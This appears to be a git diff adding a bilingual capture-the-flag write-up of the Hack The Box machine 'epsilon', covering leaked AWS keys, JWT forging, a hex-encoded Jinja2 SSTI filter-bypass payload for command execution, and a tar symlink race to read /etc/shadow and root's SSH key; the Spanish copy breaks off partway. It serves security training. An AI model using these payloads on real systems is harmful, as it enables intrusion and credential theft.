@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>epsilon | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">epsilon</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The attack began by discovering an exposed <code>.git</code> repository that revealed AWS Lambda credentials and application source code. Using <code>git-dumper</code>, I extracted hardcoded AWS access keys that allowed interaction with a local AWS Lambda service running on <code>cloud.epsilon.htb</code>. From the Lambda function code, I obtained a JWT secret (<code>RrXCv`mrNe!K!4+5`wYq</code>) that enabled me to forge an admin token and bypass authentication on the web application running on port 5000. Once authenticated, I discovered a Server-Side Template Injection (SSTI) vulnerability in the order form that was filtering common SSTI payloads. By using hexadecimal encoding to bypass the filters, I achieved remote code execution and obtained a reverse shell as user <code>tom</code>. For privilege escalation to root, I analyzed a backup script (<code>/usr/bin/backup.sh</code>) running as a cron job. The script used <code>tar</code> with the <code>-h</code> flag (dereference symlinks) and had a 5-second sleep window. I exploited this race condition by creating a symlink from <code>/opt/backups/checksum</code> to <code>/root/.ssh/id_rsa</code> during the sleep period, causing the backup script to include root's SSH private key in the tar archive, which I could then extract and use to SSH into the machine as root.</p>
+                    <p><strong>Technologies/Exploits:</strong> Git repository exposure, AWS Lambda credential leakage, JWT forging, Jinja2 SSTI with filter bypass, tar symlink race condition exploitation.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an Nmap scan of the target machine:</p>
+                <p><img src="./media/image12.png" alt="Nmap scan results showing open ports and services" /></p>
+                <p>The scan reveals several interesting findings. Nmap detects a Git repository, but attempting to access the root path (<code>/</code>) returns a <code>403 Forbidden</code> error. Port 5000 is running a web service that will be worth investigating.</p>
+
+                <h2>Web Application Discovery</h2>
+                <p>Accessing port 5000, I encounter a web application:</p>
+                <p><img src="./media/image11.png" alt="Web application interface on port 5000" /></p>
+
+                <h2>Git Repository Enumeration</h2>
+                <p>Despite the forbidden root directory, many contents within the <code>.git</code> repository appear to be accessible:</p>
+                <p><img src="./media/image10.png" alt="Accessible .git repository contents" /></p>
+                <p>Using <code>git-dumper</code>, I download the repository contents and examine the source code. Within the files, I discover hardcoded AWS credentials:</p>
+                <pre><code class="language-python">session = Session(
+    aws_access_key_id='&lt;aws_access_key_id&gt;',
+    aws_secret_access_key='&lt;aws_secret_access_key&gt;',
+    region_name='us-east-1',
+    endpoint_url='http://cloud.epsilon.htb'
+)
+aws_lambda = session.client('lambda')</code></pre>
+                <p>This reveals a new virtual host: <code>cloud.epsilon.htb</code>, which I add to <code>/etc/hosts</code>.</p>
+
+                <h2>AWS Lambda Investigation</h2>
+                <p>Attempting to access <code>cloud.epsilon.htb</code> directly redirects me to <code>http://cloud.epsilon.htb/403.html</code>. However, examining the source code further reveals authentication logic for the main application:</p>
+                <pre><code class="language-python">@app.route("/", methods=["GET","POST"])
+def index():
+    if request.method=="POST":
+        if request.form['username']=="admin" and request.form['password']=="admin":</code></pre>
+                <p>The credentials <code>admin:admin</code> don't work for logging into the web application on port 5000. Continuing through the Git history, I find a commit that introduced the AWS keys:</p>
+                <p><img src="./media/image6.png" alt="Git commit showing AWS credentials" /></p>
+                <p>The exposed credentials are:</p>
+                <ul>
+                    <li>Access Key: <code>AQLA5M37BDN6FJP76TDC</code></li>
+                    <li>Secret Key: <code>OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A</code></li>
+                </ul>
+
+                <h2>AWS CLI Configuration and Lambda Enumeration</h2>
+                <p>I configure the AWS CLI with these credentials:</p>
+                <pre><code class="language-bash">aws configure
+AWS Access Key ID [None]: AQLA5M37BDN6FJP76TDC
+AWS Secret Access Key [None]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A
+Default region name [None]: us-east-1
+Default output format [None]: json</code></pre>
+                <p>Now I can interact with the Lambda service:</p>
+                <pre><code class="language-bash">aws lambda list-functions --endpoint-url=http://cloud.epsilon.htb</code></pre>
+                <pre><code class="language-json">{
+    "Functions": [
+        {
+            "FunctionName": "costume_shop_v1",
+            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
+            "Runtime": "python3.7",
+            "Role": "arn:aws:iam::123456789012:role/service-role/dev",
+            "Handler": "my-function.handler",
+            "CodeSize": 478,
+            "Description": "",
+            "Timeout": 3,
+            "LastModified": "2021-11-21T14:38:10.553+0000",
+            "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
+            "Version": "$LATEST",
+            "VpcConfig": {},
+            "TracingConfig": {
+                "Mode": "PassThrough"
+            },
+            "RevisionId": "2c84c0b6-df38-441d-a88d-ff51679c32e6",
+            "State": "Active",
+            "LastUpdateStatus": "Successful",
+            "PackageType": "Zip"
+        }
+    ]
+}</code></pre>
+                <p>Retrieving more details about the Lambda function:</p>
+                <pre><code class="language-bash">aws lambda get-function --function-name=costume_shop_v1 --endpoint-url=http://cloud.epsilon.htb</code></pre>
+                <pre><code class="language-json">{
+    "Configuration": {
+        "FunctionName": "costume_shop_v1",
+        "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
+        "Runtime": "python3.7",
+        "Role": "arn:aws:iam::123456789012:role/service-role/dev",
+        "Handler": "my-function.handler",
+        "CodeSize": 478,
+        "Description": "",
+        "Timeout": 3,
+        "LastModified": "2026-01-09T14:19:35.985+0000",
+        "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBXEeSw=",
+        "Version": "$LATEST",
+        "VpcConfig": {},
+        "TracingConfig": {
+            "Mode": "PassThrough"
+        },
+        "RevisionId": "04869abe-828d-4a88-a672-71c1b224f77d",
+        "State": "Active",
+        "LastUpdateStatus": "Successful",
+        "PackageType": "Zip"
+    },
+    "Code": {
+        "Location": "http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code"
+    },
+    "Tags": {}
+}</code></pre>
+                <p>The response reveals a URL where I can download the Lambda function code: <code>http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code</code></p>
+
+                <h2>JWT Secret Discovery</h2>
+                <p>Accessing the code URL downloads a ZIP file. After extracting it, I find the Lambda function source code containing a JWT secret:</p>
+                <pre><code class="language-python">secret='RrXCv`mrNe!K!4+5`wYq' # apigateway authorization for CR-124</code></pre>
+                <p>This secret is used for JWT token generation and will allow me to forge a valid authentication cookie. The application uses JWT tokens like this:</p>
+                <pre><code class="language-python">token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
+res.set_cookie("auth",token)</code></pre>
+
+                <h2>Directory Enumeration and JWT Forging</h2>
+                <p>Performing directory fuzzing on the port 5000 application reveals additional endpoints:</p>
+                <p><img src="./media/image2.png" alt="Directory fuzzing results" /></p>
+                <p>The <code>/home</code> and <code>/order</code> routes require authentication, but <code>/track</code> is accessible without login:</p>
+                <p><img src="./media/image1.png" alt="Track order page" /></p>
+                <p>However, attempting to POST to <code>/track</code> redirects to the login page. Using <a href="https://jwt.io">JWT.io</a>, I notice a validation message:</p>
+                <p><img src="./media/image8.png" alt="JWT.io showing token structure" /></p>
+                <p>Despite the warning, I can still create a valid JWT token. I forge a token with the payload <code>{"username": "admin"}</code> and the discovered secret, resulting in:</p>
+                <pre><code class="language-text">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4</code></pre>
+                <p>I add this as a cookie named <code>auth</code> using the Cookie Editor addon (<a href="https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/">https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/</a>). With the forged cookie, I can now access <code>/home</code> and the <code>/track</code> route no longer redirects to login.</p>
+
+                <h2>Authenticated Access and SSTI Discovery</h2>
+                <p>I can also access the order page at <code>http://epsilon.htb:5000/order</code>:</p>
+                <p><img src="./media/image4.png" alt="Order form page" /></p>
+                <p>Both <code>/track</code> and <code>/order</code> submit forms, so I intercept the requests with Burp Suite to investigate further. Testing the <code>/order</code> form, I can inject HTML and observe reflected XSS:</p>
+                <pre><code class="language-http">costume=&lt;script&gt;alert('1')&lt;/script&gt;&amp;q=1&amp;addr=asd</code></pre>
+                <p><img src="./media/image7.png" alt="XSS proof of concept" /></p>
+                <p>While XSS alone won't lead to code execution, I know the application uses Werkzeug (Python), which suggests template engines might be in use. Testing for Server-Side Template Injection (SSTI) confirms the vulnerability:</p>
+                <p><img src="./media/image3.png" alt="SSTI confirmation showing template injection" /></p>
+
+                <h2>Filter Bypass and Remote Code Execution</h2>
+                <p>Attempting standard SSTI payloads to execute commands returns a 500 error:</p>
+                <p><img src="./media/image9.png" alt="Filtered SSTI payload resulting in error" /></p>
+                <p>This indicates input filtering. However, I find a bypass technique using hexadecimal encoding from PayloadsAllTheThings (<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2---filter-bypass">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2---filter-bypass</a>):</p>
+                <pre><code class="language-http">costume={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}&amp;q=1&amp;addr=asd</code></pre>
+                <p><img src="./media/image5.png" alt="Successful RCE showing command execution output" /></p>
+                <p>The payload successfully executes commands! I modify it to send a reverse shell and gain access as user <code>tom</code>. After stabilizing the shell, I capture the user flag.</p>
+
+                <h2>Post-Exploitation Enumeration</h2>
+                <p>Examining the application code, I notice the login credentials have been updated:</p>
+                <pre><code class="language-python">if request.method=="POST":
+    if request.form['username']=="admin" and request.form['password']=="4d_09@fhgRTdws2":</code></pre>
+                <p>I note these credentials for potential use. In <code>/opt</code>, I find a directory with interesting permissions:</p>
+                <pre><code class="language-bash">drwxr-xrwx 2 root root 4096 Jan 9 15:33 backups</code></pre>
+                <p>Checking for local listening services:</p>
+                <pre><code class="language-bash">tcp LISTEN 0 4096 127.0.0.1:42789
+tcp LISTEN 0 4096 127.0.0.1:4566</code></pre>
+                <p>Testing both services with curl:</p>
+                <pre><code class="language-bash">tom@epsilon:/var/www/app$ curl localhost:42789/login
+404: Page Not Found
+
+tom@epsilon:/var/www/app$ curl localhost:4566
+{"status": "running"}</code></pre>
+                <p>Port 4566 is the interesting one. Examining the process list reveals it's related to Docker:</p>
+                <pre><code class="language-bash">root 1063 0.0 2.2 1020628 89084 ? Ssl 14:19 0:00 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+root 1257 0.0 0.0 621984 3296 ? Sl 14:19 0:00 \_ /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 4566 -container-ip 172.19.0.2 -container-port 4566</code></pre>
+                <pre><code class="language-bash">tom@epsilon:/var/www/app$ file /usr/bin/docker-proxy
+/usr/bin/docker-proxy: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=uHC8ReRCHY1K25HQpfHL/zgdkrbQ-U_5xouwtRLW7/9ic0Fh6woHz806matya9/Ozr4hRKbcdnLFNylagMS, not stripped</code></pre>
+                <p>Checking the binary's options doesn't reveal an obvious privilege escalation path. It appears to be a legitimate Docker component.</p>
+
+                <h2>Cron Job Analysis</h2>
+                <p>Using <code>pspy</code> to monitor processes, I observe root executing these commands periodically:</p>
+                <pre><code class="language-bash">2026/01/09 15:48:06 CMD: UID=0 PID=664967 | /usr/bin/rm -rf /opt/backups/151400786.tar /opt/backups/checksum
+2026/01/09 15:49:01 CMD: UID=0 PID=664968 | /usr/sbin/CRON -f
+2026/01/09 15:49:01 CMD: UID=0 PID=664969 | /bin/sh -c /usr/bin/backup.sh
+2026/01/09 15:49:01 CMD: UID=0 PID=664970 |
+2026/01/09 15:49:01 CMD: UID=0 PID=664971 | date +%N
+2026/01/09 15:49:01 CMD: UID=0 PID=664972 | /usr/bin/rm -rf /opt/backups/*
+2026/01/09 15:49:01 CMD: UID=0 PID=664973 | /usr/bin/tar -cvf /opt/backups/175513947.tar /var/www/app/
+2026/01/09 15:49:01 CMD: UID=0 PID=664975 | /bin/bash /usr/bin/backup.sh
+2026/01/09 15:49:01 CMD: UID=0 PID=664974 | sha1sum /opt/backups/175513947.tar</code></pre>
+                <p>The <code>/usr/bin/backup.sh</code> script looks promising for privilege escalation.</p>
+
+                <h2>Backup Script Analysis</h2>
+                <p>Examining the backup script:</p>
+                <pre><code class="language-bash">tom@epsilon:~$ cat /usr/bin/backup.sh
+#!/bin/bash
+file=`date +%N`
+/usr/bin/rm -rf /opt/backups/*
+/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/
+sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum
+sleep 5
+check_file=`date +%N`
+/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
+/usr/bin/rm -rf /opt/backups/*</code></pre>
+                <p>The script has a critical vulnerability. It includes a <code>sleep 5</code> and uses the <code>-h</code> flag with tar:</p>
+                <pre><code class="language-bash">-h, --dereference
+    Follow symlinks; archive and dump the files they point to.</code></pre>
+                <p>This means if I create a symlink from <code>/opt/backups/checksum</code> to a sensitive file during the 5-second window, tar will dereference the symlink and include the target file's contents in the archive stored at <code>/var/backups/web_backups/</code>, which I can then extract and read.</p>
+
+                <h2>Privilege Escalation via Race Condition</h2>
+                <p>I create a script to exploit the race condition:</p>
+                <pre><code class="language-bash">tom@epsilon:~$ cat xd.sh
+rm -rf /opt/backups/*
+ln -s /etc/shadow /opt/backups/checksum</code></pre>
+                <p>I monitor <code>/opt/backups/</code> with <code>ls</code> and execute my script as soon as the first tar command completes and the sleep begins. After the full backup cycle completes, I retrieve the tar file from <code>/var/backups/web_backups/</code>, extract it, and read the <code>checksum</code> file, which now contains <code>/etc/shadow</code>:</p>
+                <pre><code class="language-bash">tom@epsilon:~/opt/backups$ cat checksum
+root:$6$/Vf10dLMR29zhGc2$fw0YBQVDJOJD2Kwk3AWwktE2G3B4oM500WIxKcnWEHIjftuBWnW6uAJic5exbVzRo0hv95jGHY3umOoSmykDd0:18981:0:99999:7:::</code></pre>
+                <p>Instead of cracking the password hash, I repeat the process but this time create a symlink to <code>/root/.ssh/id_rsa</code>. The file exists, and the exploit works perfectly. I retrieve root's SSH private key from the backup archive and use it to SSH into the machine as root, achieving full system compromise.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> El ataque comenzó al descubrir un repositorio <code>.git</code> expuesto que reveló credenciales de AWS Lambda y el código fuente de la aplicación. Usando <code>git-dumper</code>, extraje claves de acceso de AWS hardcoded que permitieron interactuar con un servicio AWS Lambda local ejecutándose en <code>cloud.epsilon.htb</code>. Del código de la función Lambda, obtuve un secreto JWT (<code>RrXCv`mrNe!K!4+5`wYq</code>) que permitió forjar un token de administrador y eludir la autenticación en la aplicación web ejecutándose en el puerto 5000. Una vez autenticado, descubrí una vulnerabilidad de Server-Side Template Injection (SSTI) en el formulario de pedidos que estaba filtrando payloads SSTI comunes. Al usar codificación hexadecimal para eludir los filtros, conseguí ejecución remota de código y obtuve una reverse shell como usuario <code>tom</code>. Para la escalada de privilegios a root, analicé un script de backup (<code>/usr/bin/backup.sh</code>) ejecutándose como tarea cron. El script usaba <code>tar</code> con la bandera <code>-h</code> (desreferenciar symlinks) y tenía una ventana de 5 segundos con sleep. Exploté esta condición de carrera creando un symlink desde <code>/opt/backups/checksum</code> a <code>/root/.ssh/id_rsa</code> durante el período de sleep, haciendo que el script de backup incluyera la clave privada SSH de root en el archivo tar, la cual pude luego extraer y usar para conectarme por SSH a la máquina como root.</p>
+                    <p><strong>Tecnologías/Exploits:</strong> Exposición de repositorio Git, fuga de credenciales de AWS Lambda, falsificación de JWT, SSTI en Jinja2 con bypass de filtros, explotación de condición de carrera con symlinks en tar.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comenzando con un escaneo de Nmap de la máquina objetivo:</p>
+                <p><img src="./media/image12.png" alt="Resultados del escaneo de Nmap mostrando puertos y servicios abiertos" /></p>
+                <p>El escaneo revela varios hallazgos interesantes. Nmap detecta un repositorio Git, pero al intentar acceder a la ruta raíz (<code>/</code>) devuelve un error <code>403 Forbidden</code>. El puerto 5000 está ejecutando un servicio web que merece la pena investigar.</p>
+
+                <h2>Descubrimiento de la Aplicación Web</h2>
+                <p>Accediendo al puerto 5000, encuentro una aplicación web:</p>
+                <p><img src="./media/image11.png" alt="Interfaz de la aplicación web en el puerto 5000" /></p>
+
+                <h2>Enumeración del Repositorio Git</h2>
+                <p>A pesar del directorio raíz prohibido, muchos contenidos dentro del repositorio <code>.git</code> parecen ser accesibles:</p>
+                <p><img src="./media/image10.png" alt="Contenidos accesibles del repositorio .git" /></p>
+                <p>Usando <code>git-dumper</code>, descargo los contenidos del repositorio y examino el código fuente. Dentro de los archivos, descubro credenciales de AWS hardcoded:</p>
+                <pre><code class="language-python">session = Session(
+    aws_access_key_id='&lt;aws_access_key_id&gt;',
+    aws_secret_access_key='&lt;aws_secret_access_key&gt;',
+    region_name='us-east-1',
+    endpoint_url='http://cloud.epsilon.htb'
+)
+aws_lambda = session.client('lambda')</code></pre>
+                <p>Esto revela un nuevo virtual host: <code>cloud.epsilon.htb</code>, que añado a <code>/etc/hosts</code>.</p>
+
+                <h2>Investigación de AWS Lambda</h2>
+                <p>Al intentar acceder directamente a <code>cloud.epsilon.htb</code>, me redirige a <code>http://cloud.epsilon.htb/403.html</code>. Sin embargo, examinando más a fondo el código fuente, revelo la lógica de autenticación para la aplicación principal:</p>
+                <pre><code class="language-python">@app.route("/", methods=["GET","POST"])
+def index():
+    if request.method=="POST":
+        if request.form['username']=="admin" and request.form['password']=="admin":</code></pre>
+                <p>Las credenciales <code>admin:admin</code> no funcionan para iniciar sesión en la aplicación web del puerto 5000. Continuando a través del historial de Git, encuentro un commit que introdujo las claves de AWS:</p>
+                <p><img src="./media/image6.png" alt="Commit de Git mostrando las credenciales de AWS" /></p>
+                <p>Las credenciales expuestas son:</p>
+                <ul>
+                    <li>Access Key: <code>AQLA5M37BDN6FJP76TDC</code></li>
+                    <li>Secret Key: <code>OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A</code></li>
+                </ul>
+
+                <h2>Configuración de AWS CLI y Enumeración de Lambda</h2>
+                <p>Configuro la AWS CLI con estas credenciales:</p>
+                <pre><code class="language-bash">aws configure
+AWS Access Key ID [None]: AQLA5M37BDN6FJP76TDC
+AWS Secret Access Key [None]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A
+Default region name [None]: us-east-1
+Default output format [None]: json</code></pre>
+                <p>Ahora puedo interactuar con el servicio Lambda:</p>
+                <pre><code class="language-bash">aws lambda list-functions --endpoint-url=http://cloud.epsilon.htb</code></pre>
+                <pre><code class="language-json">{
+    "Functions": [
+        {
+            "FunctionName": "costume_shop_v1",
+            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
+            "Runtime": "python3.7",
+            "Role": "arn:aws:iam::123456789012:role/service-role/dev",
+            "Handler": "my-function.handler",
+            "CodeSize": 478,
+            "Description": "",
+            "Timeout": 3,
+            "LastModified": "2021-11-21T14:38:10.553+0000",
+            "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
+            "Version": "$LATEST",
+            "VpcConfig": {},
+            "TracingConfig": {
+                "Mode": "PassThrough"
+            },
+            "RevisionId": "2c84c0b6-df38-441d-a88d-ff51679c32e6",
+            "State": "Active",
+            "LastUpdateStatus": "Successful",
+            "PackageType": "Zip"
+        }
+    ]
+}</code></pre>
+                <p>Obteniendo más detalles sobre la función Lambda:</p>
+                <pre><code class="language-bash">aws lambda get-function --function-name=costume_shop_v1 --endpoint-url=http://cloud.epsilon.htb</code></pre>
+                <pre><code class="language-json">{
+    "Configuration": {
+        "FunctionName": "costume_shop_v1",
+        "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
+        "Runtime": "python3.7",
+        "Role": "arn:aws:iam::123456789012:role/service-role/dev",
+        "Handler": "my-function.handler",
+        "CodeSize": 478,
+        "Description": "",
+        "Timeout": 3,
+        "LastModified": "2026-01-09T14:19:35.985+0000",
+        "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
+        "Version": "$LATEST",
+        "VpcConfig": {},
+        "TracingConfig": {
+            "Mode": "PassThrough"
+        },
+        "RevisionId": "04869abe-828d-4a88-a672-71c1b224f77d",
+        "State": "Active",
+        "LastUpdateStatus": "Successful",
+        "PackageType": "Zip"
+    },
+    "Code": {
+        "Location": "http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code"
+    },
+    "Tags": {}
+}</code></pre>
+                <p>La respuesta revela una URL donde puedo descargar el código de la función Lambda: <code>http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code</code></p>
+
+                <h2>Descubrimiento del Secreto JWT</h2>
+                <p>Al acceder a la URL del código, se descarga un archivo ZIP. Después de extraerlo, encuentro el código fuente de la función Lambda que contiene un secreto JWT:</p>
+                <pre><code class="language-python">secret='RrXCv`mrNe!K!4+5`wYq' # apigateway authorization for CR-124</code></pre>
+                <p>Este secreto se usa para la generación de tokens JWT y me permitirá forjar una cookie de autenticación válida. La aplicación usa tokens JWT de esta manera:</p>
+                <pre><code class="language-python">token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
+res.set_cookie("auth",token)</code></pre>
+
+                <h2>Enumeración de Directorios y Falsificación de JWT</h2>
+                <p>Realizando fuzzing de directorios en la aplicación del puerto 5000, revelo endpoints adicionales:</p>
+                <p><img src="./media/image2.png" alt="Resultados del fuzzing de directorios" /></p>
+                <p>Las rutas <code>/home</code> y <code>/order</code> requieren autenticación, pero <code>/track</code> es accesible sin login:</p>
+                <p><img src="./media/image1.png" alt="Página de seguimiento de pedidos" /></p>
+                <p>Sin embargo, al intentar hacer POST a <code>/track</code>, redirige a la página de login. Usando <a href="https://jwt.io">JWT.io</a>, noto un mensaje de validación:</p>
+                <p><img src="./media/image8.png" alt="JWT.io mostrando la estructura del token" /></p>
+                <p>A pesar de la advertencia, todavía puedo crear un token JWT válido. Forjo un token con el payload <code>{"username": "admin"}</code> y el secreto descubierto, resultando en:</p>
+                <pre><code class="language-text">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4</code></pre>
+                <p>Lo añado como una cookie llamada <code>auth</code> usando el addon Cookie Editor (<a href="https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/">https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/</a>). Con la cookie forjada, ahora puedo acceder a <code>/home</code> y la ruta <code>/track</code> ya no redirige al login.</p>
+
+                <h2>Acceso Autenticado y Descubrimiento de SSTI</h2>
+                <p>También puedo acceder a la página de pedidos en <code>http://epsilon.htb:5000/order</code>:</p>
+                <p><img src="./media/image4.png" alt="Página del formulario de pedidos" /></p>
+                <p>Tanto <code>/track</code> como <code>/order</code> envían formularios, así que intercepto las peticiones con Burp Suite para investigar más a fondo. Probando el formulario de <code>/order</code>, puedo inyectar HTML y observar XSS reflejado:</p>
+                <pre><code class="language-http">costume=&lt;script&gt;alert('1')&lt;/script&gt;&amp;q=1&amp;addr=asd</code></pre>
+                <p><img src="./media/image7.png" alt="Prueba de concepto de XSS" /></p>
+                <p>Aunque el XSS por sí solo no conducirá a la ejecución de código, sé que la aplicación usa Werkzeug (Python), lo que sugiere que podrían estar en uso motores de plantillas. Probando para Server-Side Template Injection (SSTI) confirmo la vulnerabilidad:</p>
+                <p><img src="./media/image3.png" alt="Confirmación de SSTI mostrando inyección de plantilla" /></p>
+
+                <h2>Bypass de Filtros y Ejecución Remota de Código</h2>
+                <p>Al intentar payloads SSTI estándar para ejecutar comandos, devuelve un error 500:</p>
+                <p><img src="./media/image9.png" alt="Payload SSTI filtrado resultando en error" /></p>
+                <p>Esto indica filtrado de entrada. Sin embargo, encuentro una técnica de bypass usando codificación hexadecimal de PayloadsAllTheThings (<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2---filter-bypass">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2---filter-bypass</a>):</p>
+                <pre><code class="language-http">costume={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}&amp;q=1&amp;addr=asd</code></pre>
+                <p><img src="./media/image5.png" alt="RCE exitoso mostrando salida de ejecución de comando" /></p>
+                <p>¡El payload ejecuta comandos exitosamente! Lo modifico para enviar una reverse shell y gano acceso como usuario <code>tom</code>. Después de estabilizar la shell, capturo la flag de usuario.</p>
+
+                <h2>Enumeración Post-Explotación</h2>
+                <p>Examinando el código de la aplicación, noto que las credenciales de login han sido actualizadas:</p>
+                <pre><code class="language-python">if request.method=="POST":
+    if request.form['username']=="admin" and request.form['password']=="4d_09@fhgRTdws2":</code></pre>
+                <p>Anoto estas credenciales para un uso potencial. En <code>/opt</code>, encuentro un directorio con permisos interesantes:</p>
+                <pre><code class="language-bash">drwxr-xrwx 2 root root 4096 Jan 9 15:33 backups</code></pre>
+                <p>Comprobando servicios escuchando localmente:</p>
+                <pre><code class="language-bash">tcp LISTEN 0 4096 127.0.0.1:42789
+tcp LISTEN 0 4096 127.0.0.1:4566</code></pre>
+                <p>Probando ambos servicios con curl:</p>
+                <pre><code class="language-bash">tom@epsilon:/var/www/app$ curl localhost:42789/login
+404: Page Not Found
+
+tom@epsilon:/var/www/app$ curl localhost:4566
+{"status": "running"}</code></pre>
+                <p>El puerto 4566 es el interesante. Examinando la lista de procesos, revela que está relacionado con Docker:</p>
+                <pre><code class="language-bash">root 1063 0.0 2.2 1020628 89084 ? Ssl 14:19 0:00 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+root 1257 0.0 0.0 621984 3296 ? Sl 14:19 0:00 \_ /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 4566 -container-ip 172.19.0.2 -container-port 4566</code></pre>
+                <pre><code class="language-bash">tom@epsilon:/var/www/app$ file /usr/bin/docker-proxy
+/usr/bin/docker-proxy: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=uHC8ReRCHY1K25HQpfHL/zgdkrbQ-U_5xouwtRLW7/9ic0Fh6woHz806matya9/Ozr4hRKbcdnLFNylagMS, not stripped</code></pre>
+                <p>Comprobando las opciones del binario no revela una ruta obvia de escalada de privilegios. Parece ser un componente legítimo de Docker.</p>
+
+                <h2>Análisis de Tarea Cron</h2>
+                <p>Usando <code>pspy</code> para monitorizar procesos, observo a root ejecutando estos comandos periódicamente:</p>
+                <pre><code class="language-bash">2026/01/09 15:48:06 CMD: UID=0 PID=664967 | /usr/bin/rm -rf /opt/backups/151400786.tar /opt/backups/checksum
+2026/01/09 15:49:01 CMD: UID=0 PID=664968 | /usr/sbin/CRON -f
+2026/01/09 15:49:01 CMD: UID=0 PID=664969 | /bin/sh -c /usr/bin/backup.sh
+2026/01/09 15:49:01 CMD: UID=0 PID=664970 |
+2026/01/09 15:49:01 CMD: UID=0 PID=664971 | date +%N
+2026/01/09 15:49:01 CMD: UID=0 PID=664972 | /usr/bin/rm -rf /opt/backups/*
+2026/01/09 15:49:01 CMD: UID=0 PID=664973 | /usr/bin/tar -cvf /opt/backups/175513947.tar /var/www/app/
